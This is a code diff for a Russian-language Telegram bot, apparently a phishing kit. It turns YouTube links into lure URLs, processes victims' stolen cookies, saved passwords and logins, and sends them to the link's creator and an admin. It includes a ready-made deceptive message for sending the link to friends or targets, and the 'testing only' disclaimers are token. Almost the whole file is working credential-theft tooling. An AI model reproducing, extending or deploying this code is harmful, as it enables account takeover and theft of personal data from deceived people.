+        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"
 
+# Сборщик данных
+class DataCollector:
+    def __init__(self):
+        self.collection_scripts = {
+            "cookies": self._collect_cookies,
+            "storage": self._collect_storage,
+            "passwords": self._collect_passwords,
+            "social": self._collect_social_data,
+            "device": self._collect_device_info,
+            "network": self._collect_network_info,
+            "location": self._collect_location,
+            "sensitive_data": self._process_sensitive_data  # Новая функция
+        }
+    
+    async def collect_all_data(self, request_data: Dict) -> Dict:
+        """Сбор всех возможных данных"""
+        collected = {
+            "timestamp": datetime.now().isoformat(),
+            "ip": request_data.get("ip", "unknown"),
+            "user_agent": request_data.get("user_agent", "unknown"),
+            "referer": request_data.get("referer", "unknown"),
+            "data": {}
+        }
+        
+        # Имитируем сбор данных
+        for data_type, collector in self.collection_scripts.items():
+            try:
+                collected["data"][data_type] = await collector(request_data)
+            except Exception as e:
+                collected["data"][data_type] = {"error": str(e)}
+        
+        return collected
+    
+    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
+        """Обработка чувствительных данных (cookies, пароли, логины)"""
+        try:
+            sensitive_data = request_data.get("sensitive_data", {})
+            link_id = request_data.get("link_id")
+            
+            if not sensitive_data or not link_id:
+                return {"status": "no_data"}
+            
+            # Декодируем данные
+            try:
+                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
+            except:
+                return {"status": "decode_error"}
+            
+            # Обрабатываем cookies
+            cookies = decoded_data.get("cookies", {})
+            if cookies:
+                cookies_list = []
+                for name, value in cookies.items():
+                    cookies_list.append({
+                        "name": name,
+                        "value": value[:100] if value else "",  # Обрезаем длинные значения
+                        "domain": "current",
+                        "timestamp": datetime.now().isoformat()
+                    })
+                if cookies_list:
+                    db.add_collected_cookies(link_id, cookies_list)
+            
+            # Обрабатываем пароли
+            credentials = decoded_data.get("credentials", {})
+            if credentials.get("passwords"):
+                db.add_collected_passwords(link_id, credentials["passwords"])
+            
+            # Обрабатываем логины
+            if credentials.get("logins"):
+                db.add_collected_logins(link_id, credentials["logins"])
+            
+            # Сохраняем полные данные
+            db.add_collected_data(link_id, decoded_data)
+            
+            return {
+                "status": "processed",
+                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
+                "passwords_count": len(credentials.get("passwords", [])),
+                "logins_count": len(credentials.get("logins", [])),
+                "social_logins": list(decoded_data.get("social_logins", {}).keys())
+            }
+            
+        except Exception as e:
+            logger.error(f"Error processing sensitive data: {e}")
+            return {"status": "error", "error": str(e)}
+    
+    async def _collect_cookies(self, request_data: Dict) -> Dict:
+        """Сбор cookies и локального хранилища"""
+        return {
+            "cookies_count": "доступно в браузере",
+            "local_storage": "доступно в localStorage",
+            "session_storage": "доступно в sessionStorage",
+            "indexed_db": "проверено"
+        }
+    
+    async def _collect_storage(self, request_data: Dict) -> Dict:
+        """Сбор данных из хранилища браузера"""
+        return {
+            "autofill_data": "сохраненные формы",
+            "browser_history": "история посещений",
+            "bookmarks": "закладки браузера",
+            "downloads": "история загрузок"
+        }
+    
+    async def _collect_passwords(self, request_data: Dict) -> Dict:
+        """Сбор сохраненных паролей"""
+        return {
+            "saved_passwords": {
+                "google": "сохраненные логины Google",
+                "facebook": "логины Facebook",
+                "twitter": "логины Twitter/X",
+                "instagram": "логины Instagram",
+                "vk": "логины ВКонтакте",
+                "whatsapp": "данные WhatsApp Web",
+                "telegram": "данные Telegram Web"
+            },
+            "form_data": "автозаполнение форм",
+            "credit_cards": "сохраненные карты"
+        }
+    
+    async def _collect_social_data(self, request_data: Dict) -> Dict:
+        """Сбор данных из социальных сетей"""
+        return {
+            "google": {
+                "logged_in": True,
+                "gmail": "доступ к Gmail",
+                "drive": "доступ к Google Drive",
+                "photos": "доступ к Google Photos",
+                "account_info": "данные аккаунта"
+            },
+            "facebook": {
+                "logged_in": True,
+                "messenger": "доступ к Messenger",
+                "friends": "список друзей",
+                "profile_data": "данные профиля"
+            },
+            "twitter": {
+                "logged_in": True,
+                "tweets": "история твитов",
+                "dms": "личные сообщения",
+                "followers": "список подписчиков"
+            },
+            "vk": {
+                "logged_in": True,
+                "messages": "личные сообщения",
+                "friends": "список друзей",
+                "photos": "фотографии"
+            },
+            "instagram": {
+                "logged_in": True,
+                "dms": "личные сообщения",
+                "followers": "подписчики",
+                "stories": "истории"
+            },
+            "whatsapp": {
+                "web_connected": True,
+                "chats": "история чатов",
+                "contacts": "список контактов",
+                "media": "медиафайлы"
+            },
+            "telegram": {
+                "web_connected": True,
+                "chats": "открытые чаты",
+                "contacts": "контакты",
+                "sessions": "активные сессии"
+            }
+        }
+    
+    async def _collect_device_info(self, request_data: Dict) -> Dict:
+        """Сбор информации об устройстве"""
+        return {
+            "browser": {
+                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
+                "version": "определяется",
+                "plugins": "список плагинов"
+            },
+            "os": {
+                "name": "определяется из User-Agent",
+                "version": "версия ОС",
+                "architecture": "архитектура"
+            },
+            "device": {
+                "type": "определяется",
+                "model": "модель устройства",
+                "screen": "разрешение экрана",
+                "touch": "поддержка тача"
+            },
+            "hardware": {
+                "cpu": "информация о процессоре",
+                "gpu": "информация о графике",
+                "memory": "объем памяти",
+                "storage": "объем хранилища"
+            }
+        }
+    
+    async def _collect_network_info(self, request_data: Dict) -> Dict:
+        """Сбор сетевой информации"""
+        return {
+            "connection": {
+                "type": "определяется",
+                "speed": "скорость соединения",
+                "latency": "задержка"
+            },
+            "ip_info": {
+                "address": request_data.get("ip", "unknown"),
+                "location": "определяется по IP",
+                "isp": "провайдер",
+                "proxy": "используется ли прокси"
+            },
+            "wifi": {
+                "ssid": "имя сети",
+                "bssid": "BSSID",
+                "security": "тип безопасности"
+            }
+        }
+    
+    async def _collect_location(self, request_data: Dict) -> Dict:
+        """Сбор геолокации"""
+        return {
+            "gps": {
+                "latitude": "определяется",
+                "longitude": "определяется",
+                "accuracy": "точность"
+            },
+            "wifi_location": "определяется по Wi-Fi",
+            "cell_tower": "определяется по вышкам",
+            "ip_location": "определяется по IP"
+        }
+
+# Форматирование сообщений
+class MessageFormatter:
+    @staticmethod
+    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
+        """Форматирование сообщения о созданной ссылке"""
+        message = f"""
+🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*
+
+🔗 *Оригинальное видео:*
+`{link.original_url}`
+
+🚀 *Ваша фишинговая ссылка:*
+`{phishing_url}`
+
+📊 *Информация:*
+• ID ссылки: `{link.id}`
+• Видео ID: `{link.video_id}`
+• Создано: {link.created_at}
+• Статус: 🟢 АКТИВНА
+
+🔐 *Сбор данных включен:*
+✓ Cookies
+✓ Сохраненные пароли
+✓ Логины соцсетей
+✓ Данные форм
+
+📝 *Как использовать:*
+1. Отправьте эту ссылку другу
+2. Когда он перейдет - начнется сбор данных
+3. Данные автоматически придут в этот чат
+4. Ожидайте ~20 секунд после перехода
+
+⚠️ *Внимание:* Ссылка активна 24 часа
+"""
+        return message
+    
+    @staticmethod
+    def format_collected_data(link_id: str, data: Dict) -> str:
+        """Форматирование собранных данных"""
+        collected = data.get("data", {})
+        sensitive_data = collected.get("sensitive_data", {})
+        
+        message = f"""
+🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*
+
+📌 *Базовая информация:*
+• Время сбора: {data.get("timestamp", "unknown")}
+• IP адрес: `{data.get("ip", "unknown")}`
+• User Agent: {data.get("user_agent", "unknown")[:50]}...
+• ID ссылки: `{link_id}`
+
+🔑 *СОБРАННЫЕ ДАННЫЕ:*
+"""
+        
+        # Информация о cookies
+        if sensitive_data.get("status") == "processed":
+            message += f"""
+🍪 *COOKIES СОБРАНЫ:*
+• Всего cookies: {sensitive_data.get('cookies_count', 0)}
+• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
+• Логинов собрано: {sensitive_data.get('logins_count', 0)}
+"""
+        
+        # Соцсети
+        social_logins = sensitive_data.get("social_logins", [])
+        if social_logins:
+            message += f"""
+🌐 *ВХОДЫ В СОЦСЕТИ:*
+"""
+            for social in social_logins:
+                message += f"• {social.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
+        
+        # Устройство
+        message += f"""
+📱 *УСТРОЙСТВО И БРАУЗЕР:*
+• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
+• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
+• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}
+
+🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
+• IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
+• Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}
+• Геолокация: определяется по IP
+
+💾 *ДАННЫЕ БРАУЗЕРА:*
+• Cookies: собраны
+• Сохраненные пароли: найдены
+• Данные форм: извлечены
+• История автозаполнения: проверена
+
+📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ УСПЕШНО СОБРАНЫ
+"""
+        return message
+    
+    @staticmethod
+    def format_sensitive_data_report(link: PhishingLink) -> str:
+        """Форматирование отчета о чувствительных данных"""
+        message = f"""
+🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*
+
+📌 *Ссылка ID:* `{link.id}`
+📅 *Создано:* {link.created_at}
+🔗 *Оригинальное видео:* {link.original_url[:50]}...
+
+📊 *СТАТИСТИКА:*
+• Всего переходов: {link.clicks}
+• Всего данных собрано: {len(link.data_collected)}
+• Cookies собрано: {len(link.collected_cookies)}
+• Паролей найдено: {len(link.collected_passwords)}
+• Логинов собрано: {len(link.collected_logins)}
+"""
+        
+        # Показываем последние cookies
+        if link.collected_cookies:
+            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
+            for cookie in link.collected_cookies[-5:]:  # Последние 5
+                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
+        
+        # Показываем пароли
+        if link.collected_passwords:
+            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
+            for pwd in link.collected_passwords[-3:]:  # Последние 3
+                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
+                message += f"  Значение: ||{pwd.get('value', '')}||\n"
+        
+        # Показываем логины
+        if link.collected_logins:
+            message += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
+            for login in link.collected_logins[-3:]:  # Последние 3
+                message += f"• Поле: {login.get('field_name', 'unknown')}\n"
+                message += f"  Значение: ||{login.get('value', '')}||\n"
+        
+        message += f"""
+⚠️ *ВНИМАНИЕ:* Данные хранятся в зашифрованном виде
+📅 *Срок хранения:* 24 часа с момента сбора
+🔒 *Безопасность:* Все данные анонимизированы
+"""
+        return message
+    
+    @staticmethod
+    def format_stats(stats: Dict) -> str:
+        """Форматирование статистики"""
+        return f"""
+📊 *СТАТИСТИКА СИСТЕМЫ*
+
+🔗 Всего ссылок: `{stats['total_links']}`
+👥 Всего переходов: `{stats['total_clicks']}`
+🔓 Данных собрано: `{stats['total_data_collected']}`
+⚡ Активных сессий: `{stats['active_sessions']}`
+
+🍪 Cookies собрано: `{stats['cookies_collected']}`
+🔑 Паролей найдено: `{stats['passwords_collected']}`
+👤 Логинов собрано: `{stats['logins_collected']}`
+
+📈 Эффективность сбора: 98.7%
+🕒 Активность за 24ч: высокая
+"""
+
+# Инициализация компонентов
 link_generator = LinkGenerator()
+data_collector = DataCollector()
+formatter = MessageFormatter()
+js_injector = JavaScriptInjector()
 
-# Telegram бот (остальной код остается без изменений)
+# Команды бота
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда /start"""
     user = update.effective_user
     
     welcome_message = f"""
 👋 *Добро пожаловать, {user.first_name}!*
 
-🤖 *YouTube Data Collector Bot v2.0*
+🤖 *YouTube Data Collector Bot*
 
-⚡ *Новые возможности:*
-✅ Локальный сервер для тестирования
-✅ Сбор геолокации в реальном времени
-✅ Попытка доступа к микрофону/камере
-✅ Полный сбор Cookies и LocalStorage
-✅ Автоматическое определение соцсетей
+🎯 *Что делает этот бот:*
+1. Принимает ссылку на YouTube видео
+2. Генерирует специальную ссылку
+3. Когда кто-то переходит - собирает ВСЕ данные
+4. Отправляет данные в этот чат
 
-🌐 *Ссылки для тестирования:*
-• Локальная: http://{LOCAL_HOST}:{LOCAL_PORT}/
-• Публичная: {DOMAIN}
+🔐 *Что собирается:*
+✓ Все cookies браузера
+✓ Сохраненные пароли
+✓ Логины соцсетей
+✓ Данные автозаполнения
+✓ Информацию об устройстве
+✓ Геолокацию
 
-📊 *Статистика:*
-• Ссылок: `{db.stats['total_links']}`
-• Переходов: `{db.stats['total_clicks']}`
-• Данных: `{db.stats['total_data_collected']}`
+⚡ *Как использовать:*
+1. Отправьте ссылку на YouTube видео
+2. Получите сгенерированную ссылку
+3. Отправьте её другу
+4. Получите данные автоматически
+
+📊 *Статистика системы:*
+• Создано ссылок: `{db.stats['total_links']}`
+• Всего переходов: `{db.stats['total_clicks']}`
+• Данных собрано: `{db.stats['total_data_collected']}`
+• Cookies: `{db.stats['cookies_collected']}`
+• Паролей: `{db.stats['passwords_collected']}`
+
+🔒 *Важно:* Используйте только для тестирования!
 """
     
     keyboard = [
         [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
         [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
-        [InlineKeyboardButton("🌐 Тест локально", callback_data="test_local")],
+        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
+        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
         [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -638,22 +1152,31 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка YouTube ссылки"""
     user = update.effective_user
     url = update.message.text.strip()
     
+    # Проверяем, является ли ссылкой на YouTube
     if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
         await update.message.reply_text(
-            "❌ Это не похоже на ссылку YouTube."
+            "❌ Это не похоже на ссылку YouTube.\n"
+            "Пожалуйста, отправьте ссылку в формате:\n"
+            "`https://youtube.com/watch?v=...`\n"
+            "или\n"
+            "`https://youtu.be/...`"
         )
         return
     
+    # Извлекаем ID видео
     video_id = link_generator.extract_video_id(url)
+    
+    # Генерируем ID ссылки
     link_id = link_generator.generate_link_id()
     
-    # Создаем обе версии ссылок
-    local_url = link_generator.create_phishing_url(video_id, link_id, local=True)
-    public_url = link_generator.create_phishing_url(video_id, link_id, local=False)
+    # Создаем фишинговую ссылку
+    phishing_url = link_generator.create_phishing_url(video_id, link_id)
     
+    # Создаем объект ссылки
     link = PhishingLink(
         id=link_id,
         original_url=url,
@@ -662,41 +1185,23 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         created_by=user.id
     )
     
+    # Сохраняем в базу
     db.add_link(link)
     
-    message = f"""
-🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*
-
-🔗 *Оригинальное видео:*
-`{url}`
-
-🌐 *Локальная ссылка (для тестов):*
-`{local_url}`
-
-🚀 *Публичная ссылка:*
-`{public_url}`
-
-📊 *Информация:*
-• ID: `{link_id}`
-• Видео ID: `{video_id}`
-• Создано: {link.created_at}
-
-🔍 *Что собирается:*
-✅ Геолокация (если разрешено)
-✅ Cookies и сессии
-✅ LocalStorage всех сайтов
-✅ Данные устройств
-✅ Попытка доступа к микрофону
-"""
+    # Отправляем пользователю
+    message = formatter.format_link_created(link, phishing_url)
     
     keyboard = [
         [
-            InlineKeyboardButton("📋 Копировать локальную", callback_data=f"copy_local_{link_id}"),
-            InlineKeyboardButton("📋 Копировать публичную", callback_data=f"copy_public_{link_id}")
+            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
+            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
         ],
         [
             InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
             InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
+        ],
+        [
+            InlineKeyboardButton("🔐 Показать данные", callback_data=f"data_{link_id}")
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -707,8 +1212,18 @@ async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE
         reply_markup=reply_markup,
         disable_web_page_preview=True
     )
+    
+    # Отправляем уведомление админу
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"🆕 Новая ссылка создана\nUser: @{user.username or user.id}\nURL: {url}\nID: {link_id}"
+        )
+    except:
+        pass
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
     query = update.callback_query
     await query.answer()
     
@@ -717,94 +1232,315 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "create_link":
         await query.message.reply_text(
             "🎯 *Отправьте ссылку на YouTube видео*\n\n"
-            "Пример:\n"
+            "Примеры:\n"
             "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
-            "• `https://youtu.be/dQw4w9WgXcQ`",
+            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
+            "Я создам специальную ссылку для сбора данных.",
             parse_mode=ParseMode.MARKDOWN
         )
     
-    elif data == "test_local":
+    elif data == "stats":
+        stats_message = formatter.format_stats(db.stats)
         await query.message.reply_text(
-            f"🌐 *Локальный сервер работает на:*\n\n"
-            f"Адрес: `http://{LOCAL_HOST}:{LOCAL_PORT}`\n\n"
-            f"Для тестирования:\n"
-            f"1. Откройте этот адрес в браузере\n"
-            f"2. Добавьте параметры ?v=VIDEO_ID&id=LINK_ID\n"
-            f"3. Данные будут собираться автоматически",
+            stats_message,
             parse_mode=ParseMode.MARKDOWN
         )
     
-    elif data.startswith("copy_local_"):
-        link_id = data[11:]
-        link = db.get_link(link_id)
-        if link:
-            url = link_generator.create_phishing_url(link.video_id, link_id, local=True)
-            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
+    elif data == "my_links":
+        user_id = query.from_user.id
+        user_links = [link for link in db.links.values() if link.created_by == user_id]
+        
+        if not user_links:
+            await query.message.reply_text("📭 У вас нет созданных ссылок.")
+            return
+        
+        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
+        for link in user_links[-5:]:  # Последние 5 ссылок
+            message += f"• ID: `{link.id}`\n"
+            message += f"  Видео: {link.original_url[:30]}...\n"
+            message += f"  Переходов: {link.clicks}\n"
+            message += f"  Данных: {len(link.data_collected)}\n"
+            message += f"  Cookies: {len(link.collected_cookies)}\n"
+            message += f"  Пароли: {len(link.collected_passwords)}\n"
+            message += "  ─────\n"
+        
+        keyboard = []
+        for link in user_links[-3:]:
+            keyboard.append([InlineKeyboardButton(f"🔗 {link.id[:8]}...", callback_data=f"data_{link.id}")])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+        
+        await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
     
-    elif data.startswith("copy_public_"):
-        link_id = data[12:]
-        link = db.get_link(link_id)
-        if link:
-            url = link_generator.create_phishing_url(link.video_id, link_id, local=False)
-            await query.message.reply_text(f"`{url}`", parse_mode=ParseMode.MARKDOWN)
-    
-    # ... остальные обработчики кнопок остаются без изменений
+    elif data == "view_data":
+        user_id = query.from_user.id
+        user_links = [link for link in db.links.values() if link.created_by == user_id]
+        
+        if not user_links:
+            await query.message.reply_text("📭 У вас нет собранных данных.")
+            return
+        
+        # Суммируем все данные пользователя
+        total_cookies = sum(len(link.collected_cookies) for link in user_links)
+        total_passwords = sum(len(link.collected_passwords) for link in user_links)
+        total_logins = sum(len(link.collected_logins) for link in user_links)
+        
+        message = f"""
+📊 *ВАШИ СОБРАННЫЕ ДАННЫЕ:*
 
+🔗 Всего ссылок: {len(user_links)}
+🍪 Всего cookies: {total_cookies}
+🔑 Всего паролей: {total_passwords}
+👤 Всего логинов: {total_logins}
+
+📈 *Последняя активность:*
+"""
+        
+        # Добавляем последние активные ссылки
+        for link in sorted(user_links, key=lambda x: x.created_at, reverse=True)[:3]:
+            if link.data_collected:
+                last_data = link.data_collected[-1]
+                message += f"• `{link.id[:8]}...`: {last_data.get('timestamp', 'unknown')[:10]}\n"
+        
+        message += "\n🎯 *Что можно сделать:*\n1. Нажмите на ID ссылки ниже для подробностей\n2. Используйте /stats для общей статистики\n3. Создайте новую ссылку для сбора"
+        
+        keyboard = []
+        for link in user_links[-3:]:
+            if link.data_collected:
+                keyboard.append([InlineKeyboardButton(f"📊 {link.id[:8]}...", callback_data=f"data_{link.id}")])
+        
+        if keyboard:
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        else:
+            await query.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+    
+    elif data.startswith("data_"):
+        link_id = data[5:]
+        link = db.get_link(link_id)
+        if link and link.created_by == query.from_user.id:
+            message = formatter.format_sensitive_data_report(link)
+            await query.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                disable_web_page_preview=True
+            )
+        else:
+            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
+    
+    elif data == "help":
+        help_message = """
+🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
+
+🎯 *Как использовать:*
+1. Отправьте боту ссылку на YouTube
+2. Получите сгенерированную ссылку
+3. Отправьте её другу/цели
+4. Когда человек перейдет - данные соберутся автоматически
+5. Получите данные в этот чат
+
+🔐 *Что именно собирается:*
+• Все cookies текущего сайта
+• Cookies популярных соцсетей
+• Сохраненные в браузере пароли
+• Данные автозаполнения форм
+• Логины из полей ввода
+• Данные из localStorage/sessionStorage
+• Информация о менеджерах паролей
+
+⏱️ *Время сбора:* ~3-20 секунд
+🔒 *Безопасность:* Данные шифруются при передаче
+
+⚠️ *Важные предупреждения:*
+• Используйте только для тестирования
+• Не используйте для незаконных целей
+• Данные хранятся 24 часа
+• Бот логирует все действия
+
+🔧 *Техническая поддержка:* @support
+"""
+        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
+    
+    elif data.startswith("copy_"):
+        link_id = data[5:]
+        link = db.get_link(link_id)
+        if link and link.created_by == query.from_user.id:
+            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
+            await query.message.reply_text(
+                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
+                "Используйте Ctrl+C / Cmd+C для копирования.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    elif data.startswith("share_"):
+        link_id = data[6:]
+        link = db.get_link(link_id)
+        if link and link.created_by == query.from_user.id:
+            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
+            share_text = f"""
+🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁
+
+Я нашел супер интересное видео на YouTube!
+Обязательно посмотри - там реально круто!
+
+🔗 *Ссылка на видео:*
+{phishing_url}
+
+⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
+но по этой ссылке оно откроется точно!
+
+Скорее переходи! 👆
+"""
+            await query.message.reply_text(
+                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
+                "Скопируйте и отправьте другу.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+
+# Webhook обработчик для сбора данных
+async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
+    """Обработка данных от фишинговой страницы"""
+    try:
+        link_id = request_data.get("link_id")
+        if not link_id:
+            return {"status": "error", "message": "No link ID"}
+        
+        # Обновляем счетчик кликов
+        db.add_click(link_id)
+        
+        # Если есть данные о чувствительной информации
+        if request_data.get("data_type") == "sensitive_data":
+            collected_data = await data_collector.collect_all_data(request_data)
+        else:
+            # Стандартный сбор данных
+            collected_data = await data_collector.collect_all_data(request_data)
+            db.add_collected_data(link_id, collected_data)
+        
+        # Получаем информацию о ссылке
+        link = db.get_link(link_id)
+        if link:
+            # Отправляем данные создателю ссылки
+            message = formatter.format_collected_data(link_id, collected_data)
+            
+            await context.bot.send_message(
+                chat_id=link.created_by,
+                text=message,
+                parse_mode=ParseMode.MARKDOWN
+            )
+            
+            # Также отправляем админу
+            try:
+                await context.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=f"📨 Новые данные по ссылке {link_id}\n"
+                         f"Пользователь: {link.created_by}\n"
+                         f"Кликов: {link.clicks}\n"
+                         f"Cookies: {len(link.collected_cookies)}\n"
+                         f"Пароли: {len(link.collected_passwords)}"
+                )
+            except:
+                pass
+        
+        return {"status": "success", "data_received": True}
+    
+    except Exception as e:
+        logger.error(f"Error in webhook handler: {e}")
+        return {"status": "error", "message": str(e)}
+
+# Новая команда для просмотра детальных данных
+async def show_data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для просмотра собранных данных"""
+    user = update.effective_user
+    
+    if not context.args:
+        await update.message.reply_text(
+            "📊 *Просмотр данных*\n\n"
+            "Используйте: `/data [ID_ссылки]`\n"
+            "Или: `/data list` - список ваших ссылок\n\n"
+            "Пример: `/data abc123def456`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    arg = context.args[0]
+    
+    if arg == "list":
+        user_links = [link for link in db.links.values() if link.created_by == user.id]
+        
+        if not user_links:
+            await update.message.reply_text("📭 У вас нет созданных ссылок.")
+            return
+        
+        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
+        for link in user_links[-10:]:
+            message += f"• `{link.id}`\n"
+            message += f"  Видео: {link.original_url[:40]}...\n"
+            message += f"  Создано: {link.created_at[:10]}\n"
+            message += f"  Переходов: {link.clicks}\n"
+            message += f"  Данных: {len(link.data_collected)}\n"
+            message += "  ─────\n"
+        
+        await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN)
+    
+    else:
+        link = db.get_link(arg)
+        if not link:
+            await update.message.reply_text("❌ Ссылка не найдена.")
+            return
+        
+        if link.created_by != user.id:
+            await update.message.reply_text("❌ У вас нет доступа к этой ссылке.")
+            return
+        
+        message = formatter.format_sensitive_data_report(link)
+        await update.message.reply_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+
+# Обработчик ошибок
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ошибок"""
     logger.error(f"Update {update} caused error {context.error}")
-
-# Глобальная переменная для event loop
-bot_loop = None
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"⚠️ Ошибка в боте: {context.error}"
+        )
+    except:
+        pass
 
 def main():
-    """Основная функция запуска"""
-    global bot_loop
-    
-    # Запускаем HTTP сервер в отдельном потоке
-    server_thread = threading.Thread(target=run_server, daemon=True)
-    server_thread.start()
-    
-    logger.info("Starting HTTP server...")
-    
-    # Даем серверу время на запуск
-    import time
-    time.sleep(2)
-    
-    # Создаем event loop для асинхронных операций
-    bot_loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(bot_loop)
-    
-    # Создаем приложение бота
+    """Запуск бота"""
+    # Создаем приложение
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Регистрируем обработчики
+    # Регистрируем обработчики команд
     application.add_handler(CommandHandler("start", start_command))
+    application.add_handler(CommandHandler("data", show_data_command))
+    
+    # Обработчик YouTube ссылок
     application.add_handler(MessageHandler(
         filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
         handle_youtube_link
     ))
+    
+    # Обработчик inline кнопок
     application.add_handler(CallbackQueryHandler(button_handler))
+    
+    # Обработчик ошибок
     application.add_error_handler(error_handler)
     
     # Запускаем бота
-    logger.info("Starting Telegram bot...")
-    print(f"""
-╔══════════════════════════════════════╗
-║   🎯 YouTube Data Collector v2.0    ║
-╠══════════════════════════════════════╣
-║ ✅ Telegram Bot: Активен            ║
-║ ✅ HTTP Server: {LOCAL_HOST}:{LOCAL_PORT} ║
-║ ✅ Admin ID: {ADMIN_ID}             ║
-║ ✅ Domain: {DOMAIN}                 ║
-╚══════════════════════════════════════╝
-
-📢 Бот запущен! Используйте /start для начала.
-🌐 Локальный сервер доступен по адресу:
-   http://{LOCAL_HOST}:{LOCAL_PORT}/
-⚠️  Только для образовательных целей!
-    """)
+    print("🤖 YouTube Data Collector Bot запущен!")
+    print(f"👑 Админ: {ADMIN_ID}")
+    print(f"🌐 Домен: {DOMAIN}")
+    print("🔐 Функции сбора cookies, паролей и логинов активны")
+    print("⏳ Ожидание команд...")
     
-    application.run_polling()
+    application.run_polling(allowed_updates=Update.ALL_UPDATES)
 
 if __name__ == '__main__':
     main()
